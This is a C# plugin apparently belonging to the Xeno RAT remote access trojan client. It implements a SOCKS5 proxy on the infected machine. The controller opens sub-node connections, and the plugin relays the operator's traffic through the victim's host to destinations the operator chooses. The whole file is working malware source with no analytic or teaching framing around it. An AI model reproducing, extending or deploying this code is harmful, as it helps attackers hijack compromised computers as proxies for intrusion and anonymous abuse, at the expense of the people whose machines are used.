using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node) 
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                try
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        await Sock5.Start(tempnode);
                    }
                    else
                    {
                        break;
                    }
                }
                catch 
                {
                    break;
                }
            }
            node.Disconnect();
        }
    }


    public class Sock5 
    {
        private const int BUFSIZE = 1024;
        private const int TIMEOUT_SOCKET = 5;
        private const string LOCAL_ADDR = "127.0.0.1";
        private const int LOCAL_PORT = 1234;
        private static readonly byte[] VER = new byte[] { 0x05 };
        private static byte M_NOTAVAILABLE = 0xFF;
        private static byte M_NOAUTH = 0x00;
        private static readonly byte[] CMD_CONNECT = new byte[] { 0x01 };
        private static readonly byte[] ATYP_IPV4 = new byte[] { 0x01 };
        private static readonly byte[] ATYP_DOMAINNAME = new byte[] { 0x03 };

        private static async Task ProxyLoop(Socket socketSrc, Socket socketDst)
        {
            while (socketDst.Connected && socketSrc.Connected)
            {
                try
                {

                    // Use Task.WhenAny to asynchronously wait for data availability
                    await Task.WhenAny(
                        Task.Run(() => socketSrc.Poll(1000, SelectMode.SelectRead)),
                        Task.Run(() => socketDst.Poll(1000, SelectMode.SelectRead))
                    );

                    if (socketSrc.Available > 0)
                    {
                        byte[] buffer = new byte[BUFSIZE];
                        int bytesRead = await socketSrc.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);

                        if (bytesRead == 0)
                        {
                            return;
                        }

                        await socketDst.SendAsync(new ArraySegment<byte>(buffer, 0, bytesRead), SocketFlags.None);
                    }
                    else if (socketDst.Available > 0)
                    {
                        byte[] buffer = new byte[BUFSIZE];
                        int bytesRead = await socketDst.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);

                        if (bytesRead == 0)
                        {
                            return;
                        }
                        await socketSrc.SendAsync(new ArraySegment<byte>(buffer, 0, bytesRead), SocketFlags.None);
                    }
                }
                catch
                {
                    return;
                }
                await Task.Delay(200);
            }
        }

        private static async Task<Socket> ConnectToDst(string dstAddr, int dstPort)
        {
            Socket sock = CreateSocket();
            try
            {
                await sock.ConnectAsync(dstAddr, dstPort);
                return sock;
            }
            catch
            {
                return null;
            }
        }

        private static async Task<Tuple<string, int>> RequestClient(Node wrapper)
        {
            try
            {
                byte[] s5Request = new byte[BUFSIZE];
                int bytesReceived = await wrapper.sock.sock.ReceiveAsync(new ArraySegment<byte>(s5Request), SocketFlags.None);

                if (bytesReceived == 0)
                {
                    return new Tuple<string, int>("", 0);
                }
                if (
                    s5Request[0] != VER[0] ||
                    s5Request[1] != CMD_CONNECT[0] ||
                    s5Request[2] != 0x00
                )
                {
                    return new Tuple<string, int>("", 0);
                }

                string dstAddr = "";
                int dstPort = 0;
                if (s5Request[3] == ATYP_IPV4[0])
                {
                    byte[] addrBytes = new byte[4];
                    Array.Copy(s5Request, 4, addrBytes, 0, 4);
                    dstAddr = new IPAddress(addrBytes).ToString();
                    if (BitConverter.IsLittleEndian)
                    {
                        Array.Reverse(s5Request, 8, 2);
                    }
                    dstPort = (int)BitConverter.ToUInt16(s5Request, 8);
                    Console.WriteLine(dstPort);
                }
                else if (s5Request[3] == ATYP_DOMAINNAME[0])
                {
                    int szDomainName = s5Request[4];
                    byte[] domainNameBytes = new byte[szDomainName];
                    Array.Copy(s5Request, 5, domainNameBytes, 0, szDomainName);
                    dstAddr = Encoding.ASCII.GetString(domainNameBytes);
                    dstPort = BitConverter.ToUInt16(s5Request, 5 + szDomainName);
                }
                else
                {
                    return new Tuple<string, int>("", 0);
                }

                Console.WriteLine("{0}:{1}", dstAddr, dstPort);
                return new Tuple<string, int>(dstAddr, dstPort);
            }
            catch
            {
                return new Tuple<string, int>("", 0);
            }
        }

        private static async Task Request(Node wrapper)
        {
            var dst = await RequestClient(wrapper);
            byte[] rep = { 0x07 };
            byte[] bnd = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            Socket socketDst = null;
            if (dst.Item1 != "" && dst.Item2 != 0)
            {
                socketDst = await ConnectToDst(dst.Item1, dst.Item2);
            }
            if (dst.Item1 == "" || socketDst == null)
            {
                rep[0] = 0x01;
            }
            else
            {
                rep[0] = 0x00;
                IPAddress bndAddr = ((IPEndPoint)socketDst.LocalEndPoint).Address;
                byte[] bndAddrBytes = bndAddr.GetAddressBytes();
                bnd[0] = bndAddrBytes[0];
                bnd[1] = bndAddrBytes[1];
                bnd[2] = bndAddrBytes[2];
                bnd[3] = bndAddrBytes[3];
                bnd[4] = (byte)((socketDst.LocalEndPoint as IPEndPoint).Port / 256);
                bnd[5] = (byte)((socketDst.LocalEndPoint as IPEndPoint).Port % 256);
            }
            byte[] reply = { VER[0], rep[0], 0x00, ATYP_IPV4[0], bnd[0], bnd[1], bnd[2], bnd[3], bnd[4], bnd[5] };
            try
            {
                await wrapper.sock.sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
            }
            catch
            {
                if (wrapper != null)
                {
                    wrapper.Disconnect();
                }
                if (socketDst != null)
                {
                    socketDst.Close(0);
                }
                return;
            }
            if (rep[0] == 0x00)
            {
                await ProxyLoop(wrapper.sock.sock, socketDst);
            }
            if (wrapper != null)
            {
                wrapper.Disconnect();
            }
            if (socketDst != null)
            {
                socketDst.Close(0);
            }
        }

        private static async Task<byte> subnegotiationClient(Node wrapper)
        {
            try
            {
                byte[] identificationPacket = new byte[BUFSIZE];
                int bytesRead = await wrapper.sock.sock.ReceiveAsync(new ArraySegment<byte>(identificationPacket), SocketFlags.None);
                if (identificationPacket[0] != VER[0])
                {
                    return M_NOTAVAILABLE;
                }
                int nmethods = identificationPacket[1];
                byte[] methods = new byte[nmethods];
                Array.Copy(identificationPacket, 2, methods, 0, nmethods);
                for (int i = 0; i < nmethods; i++)
                {
                    if (methods[i] == M_NOAUTH)
                    {
                        return M_NOAUTH;
                    }
                }
                return M_NOTAVAILABLE;
            }
            catch
            {
                return M_NOTAVAILABLE;
            }
        }

        private static async Task<bool> subnegotiation(Node wrapper)
        {
            byte method = await subnegotiationClient(wrapper);
            if (method != M_NOAUTH)
            {
                return false;
            }
            byte[] reply = new byte[] { VER[0], method };
            try
            {
                await wrapper.sock.sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
            }
            catch
            {
                return false;
            }
            return true;
        }

        private static async Task Connection(Node wrapper)
        {
            if (await subnegotiation(wrapper))
            {
                await Request(wrapper);
            }
        }

        private static Socket CreateSocket()
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
                return sock;
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Failed to create socket: {0}", ex.Message);
                return null;
            }
        }

        private static Socket BindPort(Socket sock)
        {
            try
            {
                Console.WriteLine("Bind {0}", LOCAL_PORT);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                sock.Bind(new IPEndPoint(IPAddress.Parse(LOCAL_ADDR), LOCAL_PORT));
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Bind failed: {0}", ex.Message);
                sock.Close(0);
            }

            try
            {
                sock.Listen(100);
            }
            catch
            {
                sock.Close(0);
            }

            return sock;
        }

        public static async Task Start(Node subnode)
        {
            Connection(subnode);
        }
    }
}
